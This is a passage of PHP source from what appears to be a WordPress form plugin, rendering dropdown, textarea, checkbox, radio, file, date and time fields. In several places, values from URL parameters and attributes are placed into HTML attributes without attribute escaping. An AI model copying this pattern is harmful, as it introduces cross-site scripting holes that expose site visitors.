                    'post_parent' => $atts['retrieve_method_parent'],
                    'posts_per_page'=>-1, 
                    'numberposts'=>-1
                );
                $posts = get_posts( $args );
                foreach( $posts as $v ) {
                    
                    // @since 1.2.5
                    if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                    if($atts['retrieve_method_value']=='slug'){
                        $data_value = $v->post_name;
                    }elseif($atts['retrieve_method_value']=='id'){
                        $data_value = $v->ID;
                    }else{
                        $data_value = $v->post_title;
                    }
                    $items[] = '<li data-value="' . esc_attr($data_value) . '" data-search-value="' . esc_attr( $v->post_title ) . '">' . $v->post_title . '</li>'; 
                }
            }
            if($atts['retrieve_method']=='csv') {
                
                // @since   1.2.5
                $delimiter = ',';
                $enclosure = '"';
                if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
                if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);

                $file = get_attached_file($atts['retrieve_method_csv']);
                if($file){
                    $row = 1;
                    if (($handle = fopen($file, "r")) !== FALSE) {
                        while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                            $num = count($data);
                            $row++;
                            $value = 'undefined';
                            $title = 'undefined';
                            for ( $c=0; $c < $num; $c++ ) {
                                if( $c==0) $value = $data[$c];
                                if( $c==1 ) $title = $data[$c];

                            }
                            if( $title=='undefined' ) {
                                $title = $value; 
                            }
                            $items[] = '<li data-value="' . esc_attr( $value ) . '" data-search-value="' . esc_attr( $title ) . '">' . $title . '</li>';
                        }
                        fclose($handle);
                    }
                }
            }
        }
        $result .= ' name="' . $atts['name'] . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';
        
        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        // @since 1.2.4
        if( $atts['enable_auto_suggest']=='true' ) {
            $result .= '<ul class="super-dropdown-ui">';
            foreach( $items as $v ) {
                $result .= $v;
            }
            $result .= '</ul>';
        }

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function textarea( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result  = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since   1.0.6    - make sure this data is set
        if( ( !isset( $atts['value'] ) ) || ( $atts['value']=='' ) ) {
            $atts['value'] = '';
        }else{
            $atts['value'] = SUPER_Common::email_tags( $atts['value'] );
        }

        // @since   1.2.4
        if( !isset( $atts['editor'] ) ) $atts['editor'] = 'false';
        if( !isset( $atts['media_buttons'] ) ) $atts['media_buttons'] = 'true';
        if( !isset( $atts['wpautop'] ) ) $atts['wpautop'] = 'true';
        if( !isset( $atts['force_br'] ) ) $atts['force_br'] = 'false';
        if( !isset( $atts['editor_height'] ) ) $atts['editor_height'] = 100;
        if( !isset( $atts['teeny'] ) ) $atts['teeny'] = 'false';
        if( !isset( $atts['quicktags'] ) ) $atts['quicktags'] = 'true';
        if( !isset( $atts['drag_drop_upload'] ) ) $atts['drag_drop_upload'] = 'true';

        if( $atts['editor']=='true' ) {
            
            if( SUPER_Forms()->is_request('ajax') ) {
                global $wp_scripts, $wp_styles, $wp_version, $tinymce_version, $concatenate_scripts, $compress_scripts;
                $version = 'ver=' . $wp_version;
                $suffix = SCRIPT_DEBUG ? '' : '';
                $abspath_inc = ABSPATH . WPINC;
                $includes_url = includes_url();
                $admin_url = admin_url();
                $style_content = '';
                $array = array(
                    'buttons' => 'buttons',
                    'editor' => 'editor',
                    'editor-buttons' => 'editor-buttons',
                    'media-views' => 'media-views',
                    'dashicons' => 'dashicons'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/css/$v{$suffix}.css" ) ) {
                        if( !in_array( $k, $wp_styles->queue ) ) $style_content .= wp_remote_fopen("{$includes_url}css/$v{$suffix}.css");
                    }
                }
                $result .= '<style type="text/css">' . $style_content . '</style>';

                ob_start();
                ?>
                <script type="text/javascript">
                /* <![CDATA[ */
                var quicktagsL10n = {"closeAllOpenTags":"Close all open tags","closeTags":"close tags","enterURL":"Enter the URL","enterImageURL":"Enter the URL of the image","enterImageDescription":"Enter a description of the image","textdirection":"text direction","toggleTextdirection":"Toggle Editor Text Direction","dfw":"Distraction-free writing mode","strong":"Bold","strongClose":"Close bold tag","em":"Italic","emClose":"Close italic tag","link":"Insert link","blockquote":"Blockquote","blockquoteClose":"Close blockquote tag","del":"Deleted text (strikethrough)","delClose":"Close deleted text tag","ins":"Inserted text","insClose":"Close inserted text tag","image":"Insert image","ul":"Bulleted list","ulClose":"Close bulleted list tag","ol":"Numbered list","olClose":"Close numbered list tag","li":"List item","liClose":"Close list item tag","code":"Code","codeClose":"Close code tag","more":"Insert Read More tag"};
                /* ]]> */
                </script>
                <?php
                $result .= ob_get_clean();

                $array = array(
                    'quicktags' => 'quicktags'
                    //'media-audiovideo' => 'media-audiovideo',
                    //'media-editor' => 'media-editor',
                    //'media-models' => 'media-models',
                    //'media-views' => 'media-views',
                    //'shortcode' => 'shortcode',
                    //'underscore' => 'underscore',
                    //'utils' => 'utils',
                    //'wp-a11y' => 'wp-a11y',
                    //'wp-backbone' => 'wp-backbone',
                    //'wp-util' => 'wp-util',
                    //'wplink' => 'wplink',
                    //'wp-embed' => 'wp-embed',
                    //'wp-emoji-release' => 'wp-emoji-release'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/js/$v{$suffix}.js" ) ) {
                        if( !in_array( $k, $wp_scripts->queue ) ) $result .= "<script type='text/javascript' src='{$includes_url}js/$v{$suffix}.js?$version'></script>";
                    }
                }
                $baseurl = includes_url();
                $baseurl_tinymce = includes_url( 'js/tinymce' );
                $mce_suffix = false !== strpos( $wp_version, '-src' ) ? '' : '.min';
                $suffix = SCRIPT_DEBUG ? '' : '';
                $compressed = $compress_scripts && $concatenate_scripts && isset($_SERVER['HTTP_ACCEPT_ENCODING'])
                    && false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip');
                if ( $compressed ) {
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/wp-tinymce.php?c=1&amp;$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl}js/utils{$suffix}.js?$version'></script>\n";
                } else {
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/tinymce{$mce_suffix}.js?$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl_tinymce}/plugins/compat3x/plugin{$suffix}.js?$version'></script>\n";
                    $result .= "<script type='text/javascript' src='{$baseurl}js/utils{$suffix}.js?$version'></script>\n";
                }
                $abspath_inc = ABSPATH . 'wp-admin';
                $array = array(
                    'editor' => 'editor',
                    'media-upload' => 'media-upload'
                );
                foreach( $array as $k => $v ) {
                    if ( file_exists( "{$abspath_inc}/js/$v{$suffix}.js" ) ) {
                        if( !in_array( $k, $wp_scripts->queue ) ) $result .= "<script type='text/javascript' src='{$admin_url}js/$v{$suffix}.js?$version'></script>";
                    }
                }


                $atts['tinymce'] = true;
                if( $atts['force_br']=='true' ) {
                    $atts['tinymce'] = array(
                        'forced_root_block' => false,
                        'force_br_newlines' => true,
                        'force_p_newlines' => false,
                        'convert_newlines_to_brs' => true,
                    );
                }
                $editor_settings = array(
                    'editor_class' => 'super-shortcode-field',
                    'textarea_name' => $atts['name'],
                    'media_buttons' => filter_var( $atts['media_buttons'], FILTER_VALIDATE_BOOLEAN ),
                    'wpautop' => filter_var( $atts['wpautop'], FILTER_VALIDATE_BOOLEAN ),
                    'editor_height' => $atts['editor_height'],
                    'teeny' => filter_var( $atts['teeny'], FILTER_VALIDATE_BOOLEAN ),
                    'tinymce' => $atts['tinymce'],
                    'quicktags' => filter_var( $atts['quicktags'], FILTER_VALIDATE_BOOLEAN ),
                    'drag_drop_upload' => filter_var( $atts['drag_drop_upload'], FILTER_VALIDATE_BOOLEAN )
                );
                ob_start();
                wp_editor( $atts['value'], $atts['name'] . '-' . absint($settings['id']), $editor_settings );
                $editor_html = ob_get_clean();
                $common_attributes = self::common_attributes( $atts, $tag );
                $editor_html = str_replace( '></textarea>', $common_attributes . ' data-force-br="' . $atts['force_br'] . '" data-teeny="' . $atts['teeny'] . '" data-incl-url="' . $includes_url . '"></textarea>', $editor_html );
                $editor_html = str_replace( '<textarea', '<textarea id="' . $atts['name'] . '-' . absint($settings['id']) . '"', $editor_html );
                $result .= str_replace( 'super-shortcode-field', 'super-shortcode-field super-text-editor', $editor_html );
            }else{
                $atts['tinymce'] = true;
                if( $atts['force_br']=='true' ) {
                    $atts['tinymce'] = array(
                        'forced_root_block' => false,
                        'force_br_newlines' => true,
                        'force_p_newlines' => false,
                        'convert_newlines_to_brs' => true,
                    );
                }
                $editor_settings = array(
                    'editor_class' => 'super-shortcode-field',
                    'textarea_name' => $atts['name'],
                    'media_buttons' => filter_var( $atts['media_buttons'], FILTER_VALIDATE_BOOLEAN ),
                    'wpautop' => filter_var( $atts['wpautop'], FILTER_VALIDATE_BOOLEAN ),
                    'editor_height' => $atts['editor_height'],
                    'teeny' => filter_var( $atts['teeny'], FILTER_VALIDATE_BOOLEAN ),
                    'tinymce' => $atts['tinymce'],
                    'quicktags' => filter_var( $atts['quicktags'], FILTER_VALIDATE_BOOLEAN ),
                    'drag_drop_upload' => filter_var( $atts['drag_drop_upload'], FILTER_VALIDATE_BOOLEAN )
                );
                ob_start();
                wp_editor( $atts['value'], $atts['name'] . '-' . absint($settings['id']), $editor_settings );
                $editor_html = ob_get_clean();
                $common_attributes = self::common_attributes( $atts, $tag );
                $editor_html = str_replace( '<textarea','<textarea '.$common_attributes.' ', $editor_html );
                $editor_html = str_replace( '<textarea', '<textarea id="' . $atts['name'] . '-' . absint($settings['id']) . '"', $editor_html );
                $result .= str_replace( 'super-shortcode-field', 'super-shortcode-field super-text-editor initialized', $editor_html );
            }
        }else{
            $result .= '<textarea class="super-shortcode-field"';
            $result .= ' name="' . $atts['name'] . '"';
            $result .= self::common_attributes( $atts, $tag );
            $result .= ' />' . $atts['value'] . '</textarea>';
        }

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function dropdown( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        
        $multiple = '';
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $multiple = ' multiple';

        $items = array();
        $placeholder = '';
        
        // @since   1.0.6
        if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
        if($atts['retrieve_method']=='custom') {
            $selected_items = array();
            foreach( $atts['dropdown_items'] as $k => $v ) {
                if( $v['checked']=='true' ) {
                    $selected_items[] = $v['value'];
                    if( $placeholder=='' ) {
                        $placeholder .= $v['label'];
                    }else{
                        $placeholder .= ', ' . $v['label'];
                    }
                    $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '" class="selected">' . $v['label'] . '</li>'; 
                }else{
                    $items[] = '<li data-value="' . esc_attr( $v['value'] ) . '">' . $v['label'] . '</li>'; 
                }
            }
            foreach($selected_items as $k => $value){
                if($k==0){
                    $atts['value'] = $value;
                }else{
                    $atts['value'] .= ','.$value;
                }
            }
        }      

        // @since   1.0.6
        if($atts['retrieve_method']=='taxonomy') {
            if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
            if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
            if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            
            $args = array(
                'hide_empty' => $atts['retrieve_method_hide_empty'],
                'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                'taxonomy' => $atts['retrieve_method_taxonomy'],
                'parent' => $atts['retrieve_method_parent'],
            );
            $categories = get_categories( $args );
            foreach( $categories as $v ) {
                // @since 1.2.5
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->slug;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->term_id;
                }else{
                    $data_value = $v->name;
                }
                $items[] = '<li data-value="' . esc_attr( $data_value ) . '">' . $v->name . '</li>'; 
            }
        }

        // @since   1.2.4
        if($atts['retrieve_method']=='post_type') {
            if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
            if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'post_type' => $atts['retrieve_method_post'],
                'exclude' => $atts['retrieve_method_exclude_post'],
                'post_parent' => $atts['retrieve_method_parent'],
                'posts_per_page'=>-1, 
                'numberposts'=>-1
            );
            $posts = get_posts( $args );
            foreach( $posts as $v ) {
                
                // @since 1.2.5
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->post_name;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->ID;
                }else{
                    $data_value = $v->post_title;
                }
                $items[] = '<li data-value="' . esc_attr($data_value) . '">' . $v->post_title . '</li>'; 
            }
        }

        // @since   1.0.6
        if($atts['retrieve_method']=='csv') {
            
            // @since   1.2.5
            $delimiter = ',';
            $enclosure = '"';
            if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
            if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);

            $file = get_attached_file($atts['retrieve_method_csv']);
            if( $file ) {
                $row = 1;
                if (($handle = fopen($file, "r")) !== FALSE) {
                    while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                        $num = count($data);
                        $row++;
                        $value = 'undefined';
                        $title = 'undefined';
                        for ( $c=0; $c < $num; $c++ ) {
                            if( $c==0) $value = $data[$c];
                            if( $c==1 ) $title = $data[$c];

                        }
                        if( $title=='undefined' ) {
                            $title = $value; 
                        }
                        $items[] = '<li data-value="' . esc_attr( $value ) . '">' . $title . '</li>';
                    }
                    fclose($handle);
                }
            }
        }

        if( $placeholder!='' ) {
            $atts['placeholder'] = $placeholder;
        }
        if( empty( $atts['placeholder'] ) ) {
            $atts['placeholder'] = $atts['dropdown_items'][0]['label'];
            $atts['value'] = $atts['dropdown_items'][0]['value'];
            $atts['dropdown_items'][0]['checked'] = true;
            $items[0] = '<li data-value="' . esc_attr( $atts['value'] ) . '" class="selected">' . $atts['placeholder'] . '</li>'; 
        }
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        $result .= '<input class="super-shortcode-field" type="hidden"';
        if( !isset( $atts['value'] ) ) $atts['value'] = '';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '<ul class="super-dropdown-ui' . $multiple . '">';
        $result .= '<li data-value="" class="super-placeholder">' . $atts['placeholder'] . '</li>';
        foreach( $items as $v ) {
            $result .= $v;
        }
        $result .= '</ul>';
        $result .= '<span class="super-dropdown-arrow"></span>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;    
    }
    public static function dropdown_items( $tag, $atts ) {
        return '<li data-value="' . esc_attr( $atts['value'] ) . '">' . $atts['label'] . '</li>'; 
    }
    public static function checkbox( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $classes = ' display-' . $atts['display'];
        $result = self::opening_tag( $tag, $atts, $classes );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $checked_items = array();
        $items = array();
        
        // @since   1.2.7
        if( !isset( $atts['retrieve_method'] ) ) $atts['retrieve_method'] = 'custom';
        if($atts['retrieve_method']=='custom') {
            foreach( $atts['checkbox_items'] as $k => $v ) {
                if( ($v['checked']=='true') ) $checked_items[] = $v['value'];
                if( !isset( $v['image'] ) ) $v['image'] = '';
                if( $v['image']!='' ) {
                    $image = wp_get_attachment_image_src( $v['image'] );
                    $image = !empty( $image[0] ) ? $image[0] : '';
                    $item = '';
                    $item .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? ' class="super-has-image"' : ' class="super-has-image super-selected"' ) . '>';
                    if( !empty( $image ) ) {
                        $item .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                    }else{
                        $image = SUPER_PLUGIN_FILE . 'assets/images/image-icon.png';
                        $item .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                    }
                    $item .= '<input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="checkbox" value="' . esc_attr( $v['value'] ) . '" />';
                    $item .= $v['label'];
                    $item .='</label>';
                }else{
                    $item = '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : ' class="super-selected"' ) . '><input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="checkbox" value="' . esc_attr( $v['value'] ) . '" />' . $v['label'] . '</label>';
                }
                $items[] = $item;
            }
            foreach($checked_items as $k => $value){
                if($k==0){
                    $atts['value'] = $value;
                }else{
                    $atts['value'] .= ','.$value;
                }
            }
        }      

        // @since   1.2.7
        if($atts['retrieve_method']=='taxonomy') {
            if( !isset( $atts['retrieve_method_taxonomy'] ) ) $atts['retrieve_method_taxonomy'] = 'category';
            if( !isset( $atts['retrieve_method_exclude_taxonomy'] ) ) $atts['retrieve_method_exclude_taxonomy'] = '';
            if( !isset( $atts['retrieve_method_hide_empty'] ) ) $atts['retrieve_method_hide_empty'] = 0;
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'hide_empty' => $atts['retrieve_method_hide_empty'],
                'exclude' => $atts['retrieve_method_exclude_taxonomy'],
                'taxonomy' => $atts['retrieve_method_taxonomy'],
                'parent' => $atts['retrieve_method_parent'],
            );
            $categories = get_categories( $args );
            foreach( $categories as $v ) {
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->slug;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->term_id;
                }else{
                    $data_value = $v->name;
                }
                $items[] = '<label><input type="checkbox" value="' . esc_attr( $data_value ) . '" />' . $v->name . '</label>';
            }
        }

        // @since   1.2.7
        if($atts['retrieve_method']=='post_type') {
            if( !isset( $atts['retrieve_method_post'] ) ) $atts['retrieve_method_post'] = 'post';
            if( !isset( $atts['retrieve_method_exclude_post'] ) ) $atts['retrieve_method_exclude_post'] = '';
            if( !isset( $atts['retrieve_method_parent'] ) ) $atts['retrieve_method_parent'] = '';
            $args = array(
                'post_type' => $atts['retrieve_method_post'],
                'exclude' => $atts['retrieve_method_exclude_post'],
                'post_parent' => $atts['retrieve_method_parent'],
                'posts_per_page'=>-1, 
                'numberposts'=>-1
            );
            $posts = get_posts( $args );
            foreach( $posts as $v ) {
                if( !isset( $atts['retrieve_method_value'] ) ) $atts['retrieve_method_value'] = 'slug';
                if($atts['retrieve_method_value']=='slug'){
                    $data_value = $v->post_name;
                }elseif($atts['retrieve_method_value']=='id'){
                    $data_value = $v->ID;
                }else{
                    $data_value = $v->post_title;
                }
                $items[] = '<label><input type="checkbox" value="' . esc_attr( $data_value ) . '" />' . $v->post_title . '</label>';
            }
        }

        // @since   1.2.7
        if($atts['retrieve_method']=='csv') {
            $delimiter = ',';
            $enclosure = '"';
            if( isset( $atts['retrieve_method_delimiter'] ) ) $delimiter = $atts['retrieve_method_delimiter'];
            if( isset( $atts['retrieve_method_enclosure'] ) ) $enclosure = stripslashes($atts['retrieve_method_enclosure']);
            $file = get_attached_file($atts['retrieve_method_csv']);
            if( $file ) {
                $row = 1;
                if (($handle = fopen($file, "r")) !== FALSE) {
                    while (($data = fgetcsv($handle, 1000, $delimiter, $enclosure)) !== FALSE) {
                        $num = count($data);
                        $row++;
                        $value = 'undefined';
                        $title = 'undefined';
                        for ( $c=0; $c < $num; $c++ ) {
                            if( $c==0) $value = $data[$c];
                            if( $c==1 ) $title = $data[$c];

                        }
                        if( $title=='undefined' ) {
                            $title = $value; 
                        }
                        $items[] = '<label><input type="checkbox" value="' . esc_attr( $value ) . '" />' . $title . '</label>';
                    }
                    fclose($handle);
                }
            }
        }
        foreach( $items as $v ) {
            $result .= $v;
        }

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' name="' . esc_attr( $atts['name'] ) . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function radio( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $classes = ' display-' . $atts['display'];
        $result = self::opening_tag( $tag, $atts, $classes );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        foreach( $atts['radio_items'] as $k => $v ) {
            if( $v['checked']=='true' ) $atts['value'] = $v['value'];
            
            // @since   1.2.3
            if( !isset( $v['image'] ) ) $v['image'] = '';
            if( $v['image']!='' ) {
                $image = wp_get_attachment_image_src( $v['image'] );
                $image = !empty( $image[0] ) ? $image[0] : '';
                $result .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? ' class="super-has-image"' : ' class="super-has-image super-selected"' ) . '>';
                if( !empty( $image ) ) {
                    $result .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                }else{
                    $image = SUPER_PLUGIN_FILE . 'assets/images/image-icon.png';
                    $result .= '<div class="image" style="background-image:url(\'' . $image . '\');"><img src="' . $image . '"></div>';
                }
                $result .= '<input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $v['value'] ) . '" />';
                $result .= $v['label'];
                $result .='</label>';

            }else{
                $result .= '<label' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : ' class="super-selected"' ) . '><input ' . ( (($v['checked']==='false') || ($v['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $v['value'] ) . '" />' . $v['label'] . '</label>';
            }
        }
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' name="' . esc_attr( $atts['name'] ) . '" value="' . $atts['value'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function radio_items( $tag, $atts ) {
        return '<label><input ' . ( (($atts['checked']==='false') || ($atts['checked']===false)) ? '' : 'checked="checked"' ) . ' type="radio" value="' . esc_attr( $atts['value'] ) . '" />' . $atts['label'] . '</label>';
    }
    public static function file( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $dir = SUPER_PLUGIN_FILE . 'assets/js/frontend/jquery-file-upload/';
        wp_enqueue_script( 'jquery-ui-widget' );
        wp_enqueue_script( 'super-upload-iframe-transport', $dir . 'jquery.iframe-transport.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload', $dir . 'jquery.fileupload.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload-process', $dir . 'jquery.fileupload-process.js', array( 'jquery' ), SUPER_VERSION, false );
        wp_enqueue_script( 'super-upload-fileupload-validate', $dir . 'jquery.fileupload-validate.js', array( 'jquery' ), SUPER_VERSION, false );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<div class="super-fileupload-button"';
        $style = '';
        if( !isset( $atts['extensions'] ) ) $atts['extensions'] = 'jpg|jpeg|png|gif|pdf';
        if( !isset( $atts['width'] ) ) $atts['width'] = 0;
        if( $atts['width']!=0 ) $style .= 'width:' . $atts['width'] . 'px;';
        if( !empty( $styles ) ) $style .= $styles;
        if( !empty( $style ) ) $result .= ' style="'.$style.'"';
        $result .= '><i class="fa fa-plus"></i><span class="super-fileupload-button-text">' . $atts['placeholder'] . '</span></div>';
        $atts['placeholder'] = '';
        $result .= '<input class="super-shortcode-field super-fileupload" type="file" name="files[]" data-file-size="' . $atts['filesize'] . '" data-accept-file-types="' . $atts['extensions'] . '" data-url="' . SUPER_PLUGIN_FILE . 'uploads/php/"';
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $result .= ' multiple';
        $result .= ' />';
        $result .= '<input class="super-selected-files" type="hidden"';
        $result .= ' value="" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';
        $result .= '<div class="super-progress-bar"></div>';
        $result .= '<div class="super-fileupload-files"></div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function date( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'jquery-ui-datepicker', false, array( 'jquery' ), SUPER_VERSION );
        wp_enqueue_script( 'super-date-format', SUPER_PLUGIN_FILE . 'assets/js/frontend/date-format.min.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<input class="super-shortcode-field super-datepicker" type="text" autocomplete="off" ';
        $format = $atts['format'];
        if( $format=='custom' ) $format = $atts['custom_format'];

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }

        // @since 1.1.8 - added option to select an other datepicker to achieve date range with 2 datepickers (useful for booking forms)
        if( !isset( $atts['connected_min'] ) ) $atts['connected_min'] = '';
        if( !isset( $atts['connected_max'] ) ) $atts['connected_max'] = '';

        // @since 1.2.5 - added option to add or deduct days based on connected datepicker
        if( !isset( $atts['connected_min_days'] ) ) $atts['connected_min_days'] = '1';
        if( !isset( $atts['connected_max_days'] ) ) $atts['connected_max_days'] = '1';

        if( !isset( $atts['range'] ) ) $atts['range'] = '-100:+5';
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-format="' . $format . '" data-connected_min="' . $atts['connected_min'] . '" data-connected_min_days="' . $atts['connected_min_days'] . '" data-connected_max="' . $atts['connected_max'] . '" data-connected_max_days="' . $atts['connected_max_days'] . '" data-range="' . $atts['range'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function time( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'jquery-timepicker', SUPER_PLUGIN_FILE . 'assets/js/frontend/timepicker.min.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field super-timepicker" type="text" autocomplete="off" ';
        if( !isset( $atts['range'] ) ) $atts['range'] = '';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-format="' . $atts['format'] . '" data-step="' . $atts['step'] . '" data-range="' . $atts['range'] . '" data-duration="' . $atts['duration'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
